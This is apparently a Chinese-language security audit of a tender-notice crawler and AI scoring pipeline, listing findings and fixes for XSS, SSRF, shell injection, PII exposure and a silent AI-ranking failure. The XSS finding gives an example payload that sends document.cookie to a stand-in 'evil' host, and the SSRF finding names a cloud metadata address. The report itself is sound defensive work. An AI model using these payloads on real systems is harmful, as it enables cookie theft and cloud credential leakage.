## Findings（10: 2 HIGH / 3 MEDIUM / 3 LOW / 2 INFO）

### PA-H-001 — AI 精排因 format-string 失败被静默禁用 [HIGH, route-fix]
- **file/line**: `pipeline/ai_ranker.py:114` (调用方 `pipeline/score_worker.py:60` try/except at `:74`)
- **finding**: `AI_PROMPT.format(title=..., raw_text=notice.get("raw_text","")[:2000], ...)` —— `AI_PROMPT` 是带 `{title}`/`{raw_text}` 等占位符的 str 模板，`.format()` 会把 raw_text 中任意 `{...}` 当作占位符替换。招投标公告正文 HTML 抽取的 raw_text 几乎必然含 `{` `}`（内联 JS/CSS/JSON/花括号），命中未定义占位符即 `KeyError`，或 `{` 无配对即 `ValueError`。`score_worker.py:74` `except Exception` 兜住 → `ai_rank_failed` 日志 → `ai_score=None` → `final_score=rule_score`（仅规则分）。
- **impact**: AI 精排（整个管线的核心价值——把规则分 60 的"可挖掘"用 LLM 重排到 85"直接投"）对受影响公告**静默失效**，落回纯规则分。无崩溃、无告警，运营者无从感知哪条公告被 AI 跳过。受影响比例随 raw_text 中花括号密度，估计 30%+。
- **evidence**: `AI_PROMPT` 模板含 `{{"recommend_level":...}}`（已转义为示例），但 `raw_text` 占位符 `{raw_text}` 是真占位符；`score_worker.py:66` 传入 `(raw_text or "")[:2000]` 未对花括号转义；`score_worker.py:74` `except Exception as e: log.warning("ai_rank_failed", ...)` 静默吞错。
- **remediation**: 不用 `str.format` 拼接含 `{` 的用户数据。改 `AI_PROMPT.replace("{title}", title).replace("{raw_text}", raw_text[:2000])...`，或改 `string.Template` + `safe_substitute`，或 f-string 拼接。附 regression：构造 raw_text=`{"a":1}` 的 fixture 断言不抛、AI 仍被调用。

### PA-H-002 — 日报 HTML 存储型 XSS [HIGH, route-fix]
- **file/line**: `pipeline/notifier.py:106` (`_render_html` 的 `rows` f-string)
- **finding**: `_render_html` 用 f-string 把 `item.get('detail_url','#')`、`item.get('title','')[:50]`、`item.get('purchaser','-')` 直接插进 `<a href="{detail_url}">{title}</a>` / `<td>{purchaser}</td>`，**无 `html.escape`**。这些字段来自被爬公告（attacker-controlled：招标平台上的公告标题/链接可由投放方控制）。
- **impact**: 恶意公告标题 `<img src=x onerror=fetch('//evil/'+document.cookie)>` 或 detail_url `"><script>...` 注入日报 HTML，运营者在浏览器打开日报（或 WeChat 文件预览）即执行。存储型 XSS，持久存于 backup/daily-report-*.html。
- **evidence**: `notifier.py:106` `<a href="{item.get('detail_url', '#')}" target="_blank">{item.get('title', '')[:50]}</a>` 无转义；`:107` `<td>{item.get('purchaser', '-')}</td>` 无转义；同文件 `:103-110` 整个 rows 拼接无任何 escape 调用；`html` 模块未 import。
- **remediation**: `import html`；对 detail_url/title/purchaser/province 等 crawled 字段 `html.escape(s, quote=True)`；detail_url 额外校验 scheme ∈ {http,https} 否则置 `#`。或改 Jinja2 autoescape 模板。

### PA-M-001 — config_driven 源因 NameError 全部不可用 [MEDIUM, route-fix]
- **file/line**: `scripts/crawl_scheduler.py:63`
- **finding**: `crawl_source(source_config, proxy, throttler, robots, circuit_breaker)` 是模块级函数，函数体内 `os.path.join(config_dir, "..", adapter_yaml)` 引用 `config_dir` —— 但 `config_dir` 只在 `main()` 内 (`:137`) 定义为局部变量，既非参数也非模块全局。当 `source_config["source_type"]=="config_driven"` 且 `adapter_yaml` 非空时触发 `NameError: name 'config_dir' is not defined`。
- **impact**: ConfigDrivenAdapter（按 YAML 适配省级 JSON API 的核心扩展机制，`crawler/config_driven_adapter.py` 整个类）在调度器入口即崩，该 source 返回 0，所有 config_driven 型数据源静默不采集。
- **evidence**: `crawl_source` 签名 (`:40`) 无 `config_dir` 参数；模块顶层无 `config_dir` 全局；`:63` 引用 `config_dir`；`main():137` `config_dir = os.environ.get("CONFIG_DIR","config")` 为局部。
- **remediation**: 把 `config_dir` 作为参数传入 `crawl_source`（`main()` 调用处 `:179` 传入），或 `crawl_source` 内 `config_dir = os.environ.get("CONFIG_DIR","config")` 自取。

### PA-M-002 — 爬虫 HTTP 层 SSRF（redirect + detail_url 不可信）[MEDIUM, route-fix]
- **file/line**: `crawler/fetch.py:57`、`crawler/base.py:44`、`crawler/anti_detect.py:121`、`scripts/crawl_scheduler.py:156`
- **finding**: 4 处 httpx/curl 客户端均 `follow_redirects=True` 且无 host/scheme/IP 校验；`crawler/ggzy_national.py:227` `detail_url = urljoin(self.source["base_url"], detail)`，当 API 返回的 `detail`/`url`/`detailUrl` 为 `//evil.com/x` 或 `https://169.254.169.254/...` 时，urljoin 生成跨域/内网 URL，crawler 跟随并 `raw_text` 落库 → `web_admin` `notice_detail` 展示。
- **impact**: 被爬站点或被投毒的 API 响应可驱动 crawler 访问云元数据 (`169.254.169.254`) / 内网管理端 / localhost，响应体进入 DB 和管理后台。典型盲 SSRF → 云凭证泄漏。
- **evidence**: `fetch.py:55-57` `follow_redirects=True`；`base.py:43-45` 同；`anti_detect.py:120-122` 同；`crawl_scheduler.py:154-158` `httpx.AsyncClient(follow_redirects=True)`；`ggzy_national.py:226-227` `if not detail_url.startswith("http"): detail_url = urljoin(...)` 但对 `//evil` 和 `https://internal` 不拦。
- **remediation**: 抽一个 `_safe_url(url, allow_hosts)` —— 校验 scheme∈{http,https}、netloc 在 source_registry 白名单、`ipaddress.ip_address` 解析后拒 private/loopback/link-local/multicast；redirect 用 `httpx` event_hooks 或手动 `client.get(url, follow_redirects=False)` 逐跳校验 Location。

### PA-M-003 — wechat_push chat_id 未引用致 shell 注入面 [MEDIUM, route-fix]
- **file/line**: `pipeline/wechat_push.py:71,87`
- **finding**: `_build_hermes_cmd` 中 `to = f"weixin:{chat_id}"`（chat_id 未过 `_quote`），随后 `parts = [HERMES_PATH, "send", "--to", to, _quote(body)]` + `" ".join(parts)` → `bash -c <cmd>`。`body` 经 `_quote` 单引号转义（安全），但 `to` 裸拼。chat_id 含 `;`/`$()`/反引号即注入。
- **impact**: 当前 chat_id 来自 config/CLI（低暴露），但无任何校验，一旦 chat_id 来自外部（如未来 web_admin 动态推送目标）即 RCE。防御性应堵。
- **evidence**: `:70-73` `to = f"weixin:{chat_id}"` 无 quote；`:87` `parts = [..., to, _quote(body)]` 仅 body 被 quote；`:52` 执行 `["bash","-c",command]`；`_quote` (`:55-57`) 仅对 body 用。
- **remediation**: `to` 也 `_quote(to)`，或 `chat_id` 入口校验 `re.fullmatch(r"[A-Za-z0-9_-]+", chat_id)`。

### PA-L-001 — raw_text 落库未脱敏，PII 在 admin UI 可见 [LOW, route-fix]
- **file/line**: `parser/html_parser.py:28`、`pipeline/score_worker.py:51`、`web_admin/app.py:207`
- **finding**: `parse_notice_html` 仅对 `_extract_contact(text)` 跑 `PIIMasker.mask`，但 `raw_text: text[:30000]` 整段原文（含投标人手机/邮箱/身份证/银行卡）原样落 `tender_notice_content.raw_text`。`score_worker` 读 raw_text 喂 AI，`web_admin/notice_detail` `SELECT n.*, c.raw_text, ...` 渲染到 detail.html。
- **impact**: PII 明文入库 + 管理后台可查（虽 admin 已认证，但 contact_text 已脱敏而 raw_text 没有，标准不一致；DB 备份/泄漏时 PII 裸奔）。
- **evidence**: `html_parser.py:22-23` `contact_masked = PIIMasker.mask(contact_raw)` 仅 contact；`:28` `"raw_text": text[:30000]` 未 mask；`web_admin/app.py:207` SELECT 含 `c.raw_text`。
- **remediation**: `raw_text` 落库前 `PIIMasker.mask(text)`（保留 masked 版供检索/展示，原始正文如有需要另存加密列）；或在 admin detail 模板对 raw_text 显式 mask 后渲染。

### PA-L-002 — robots_checker 缓存无界无 TTL [LOW, route-fix]
- **file/line**: `crawler/robots_checker.py:12,30`
- **finding**: `self._cache: dict[str, RobotFileParser]` 只增不删、无 TTL。scheduler 长跑（`crawl_interval=1800`，多省多域）持续累积，每个新 netloc 永久驻留。
- **impact**: 长期运行内存单调增长；robots.txt 变更后不刷新（已封禁路径可能被缓存为允许）。
- **evidence**: `:30` `if robots_url not in self._cache: self._cache[robots_url] = ...`，无 `clear` 调用除手动 `clear_cache()`；无时间戳。
- **remediation**: 改 `dict[str, tuple[float, RobotFileParser]]` + TTL（如 24h），或 `cachetools.TTLCache`。

### PA-L-003 — 浏览器爬虫 --disable-web-security 抓不可信页 [LOW, route-fix]
- **file/line**: `crawler/browser_crawler.py:57` (`CHROMIUM_STEALTH_ARGS`)
- **finding**: Chromium fallback 启动参数含 `--disable-web-security`（同源策略关闭）+ `--no-sandbox`，用该浏览器 `fetch_page(任意 detail_url)` 抓取被爬公告（untrusted）。
- **impact**: 恶意公告页在 web-security 关闭的浏览器里可跨域读资源 / 探测内网 / 读 file://（若配合其他 flag）。crawler 只取 HTML 但浏览器进程本身被污染页利用。
- **evidence**: `:49-60` `CHROMIUM_STEALTH_ARGS` 含 `"--disable-web-security"`、`"--no-sandbox"`；`:203` `fetch_page(url)` url 来自调用方（最终来自 detail_url）。
- **remediation**: 删 `--disable-web-security`（反爬不需要它，UA/stealth script 已够）；`--no-sandbox` 仅容器内保留并注释理由。

### PA-I-001 — hermes 临时脚本路径可预测 [INFO, route-fix]
- **file/line**: `pipeline/wechat_push.py:45`
- **finding**: Windows 路径下写 `tempfile.gettempdir()/hermes_push.sh` 固定文件名，每次覆盖。
- **impact**: 共享主机存在 symlink race / 被预置恶意脚本覆盖风险。Linux 路径走 `bash -c` 不写文件（仅 Windows 分支受影响）。
- **evidence**: `:45` `sh_path = os.path.join(tempfile.gettempdir(), "hermes_push.sh")`。
- **remediation**: `tempfile.NamedTemporaryFile(delete=False, suffix=".sh")` 拿随机名，用完 unlink。

### PA-I-002 — notice_detail SELECT n.* 字段扩散泄漏面 [INFO, route-fix]
- **file/line**: `web_admin/app.py:207` (`notice_detail`)
- **finding**: `SELECT n.*, c.raw_text, c.qualification_text, c.contact_text_masked FROM tender_notice n ...` 用 `n.*`，未来给 `tender_notice` 加任何敏感列（如 raw_contact、internal_note）会自动进 detail.html 渲染面。
- **impact**: 列扩散导致的意外信息泄漏（当前无敏感列，故 INFO）。
- **evidence**: `:206-212` `SELECT n.*, ...`。
- **remediation**: 显式列名 `SELECT n.id, n.title, n.purchaser, ...`，与 `notice_list` 风格一致。
